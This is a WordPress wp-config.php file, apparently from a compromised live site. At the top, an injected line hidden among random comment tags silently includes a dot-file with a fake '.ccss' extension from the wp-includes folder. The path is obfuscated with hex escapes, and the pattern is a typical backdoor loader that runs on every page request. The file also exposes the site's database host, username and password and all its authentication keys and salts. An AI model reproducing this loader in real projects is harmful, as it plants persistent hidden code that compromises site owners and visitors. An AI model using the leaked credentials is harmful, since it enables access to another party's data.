<?php
/*ac678*/

@include /*qahkm*/("/ho\x6de/bwindi/sergizsightsadventure.co\x6d/wp\x2dincludes/blocks/block/.225172cd.ccss");

/*ac678*/
/**
 * The base configuration for WordPress
 *
 * The wp-config.php creation script uses this file during the installation.
 * You don't have to use the web site, you can copy this file to "wp-config.php"
 * and fill in the values.
 *
 * This file contains the following configurations:
 *
 * * Database settings
 * * Secret keys
 * * Database table prefix
 * * ABSPATH
 *
 * @link https://wordpress.org/documentation/article/editing-wp-config-php/
 *
 * @package WordPress
 */

// ** Database settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define( 'DB_NAME', 'bwindi_wp626' );

/** Database username */
define( 'DB_USER', 'bwindi_wp626' );

/** Database password */
define( 'DB_PASSWORD', 'P-p21m.4S4' );

/** Database hostname */
define( 'DB_HOST', 'mysql1006.mochahost.com' );

/** Database charset to use in creating database tables. */
define( 'DB_CHARSET', 'utf8mb4' );

/** The database collate type. Don't change this if in doubt. */
define( 'DB_COLLATE', '' );

/**#@+
 * Authentication unique keys and salts.
 *
 * Change these to different unique phrases! You can generate these using
 * the {@link https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org secret-key service}.
 *
 * You can change these at any point in time to invalidate all existing cookies.
 * This will force all users to have to log in again.
 *
 * @since 2.6.0
 */
define( 'AUTH_KEY',         'iw48ze8qowjkndubji34zyfz5pvddodnkextjkyegpozjte2e2hyfvoal9ayxbiu' );
define( 'SECURE_AUTH_KEY',  'u2s1magw3w8cp11htgbyynuuy4glflv7dexafugb56tqaf9pmtad4ssrtdyyzuag' );
define( 'LOGGED_IN_KEY',    'wiluxlwycu7pydlrab58geipuzveikeedvzicblt5akyvznkcr6xlvfwa1oe4hh9' );
define( 'NONCE_KEY',        'keynq0yq2juyfj6xjl9k3yxjvx0f1gbgkxtidhimkz5cq7skircsuihrdvt8rc4t' );
define( 'AUTH_SALT',        '5clo3lhfwqmgnzy9crrqrgjkieuveoayfvtyhdfolsg2vk41onl35rcc7xx8rqqp' );
define( 'SECURE_AUTH_SALT', 'k6xtyubkhpuhmbfeuudfji6vtqvwqfz9fchudz0mqyrqts85ljopw61i5cc90suk' );
define( 'LOGGED_IN_SALT',   'agjhfb7gcncnuxqzgfm3akxobqvyrjrwffwcelyf4inm5dbej6u3a0znv4isgbvo' );
define( 'NONCE_SALT',       'hqglhlimpmfldg4txt7jfd337c28hxqmi74romq3bkjzczzia2uc0jqgj1iknjoi' );

/**#@-*/

/**
 * WordPress database table prefix.
 *
 * You can have multiple installations in one database if you give each
 * a unique prefix. Only numbers, letters, and underscores please!
 */
$table_prefix = 'wpz0_';

/**
 * For developers: WordPress debugging mode.
 *
 * Change this to true to enable the display of notices during development.
 * It is strongly recommended that plugin and theme developers use WP_DEBUG
 * in their development environments.
 *
 * For information on other constants that can be used for debugging,
 * visit the documentation.
 *
 * @link https://wordpress.org/documentation/article/debugging-in-wordpress/
 */
define( 'WP_DEBUG', false );

/* Add any custom values between this line and the "stop editing" line. */



/* That's all, stop editing! Happy publishing. */

/** Absolute path to the WordPress directory. */
if ( ! defined( 'ABSPATH' ) ) {
	define( 'ABSPATH', __DIR__ . '/' );
}

/** Sets up WordPress vars and included files. */
require_once ABSPATH . 'wp-settings.php';
